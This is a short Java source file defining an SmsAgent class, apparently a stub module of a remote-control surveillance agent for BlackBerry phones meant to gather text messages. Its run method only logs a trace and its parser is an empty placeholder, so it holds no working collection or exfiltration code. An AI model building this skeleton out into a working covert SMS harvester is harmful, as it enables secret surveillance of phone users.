package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class SmsAgent extends Agent {
	//#debug
    static Debug debug = new Debug("SmsAgent", DebugLevel.VERBOSE);

    public SmsAgent(boolean agentStatus) {
        super(AGENT_SMS, agentStatus, true, "SmsAgent");
    }

    protected SmsAgent(boolean agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void actualRun() {
        // #debug
        debug.trace("run");

    }

    protected boolean parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
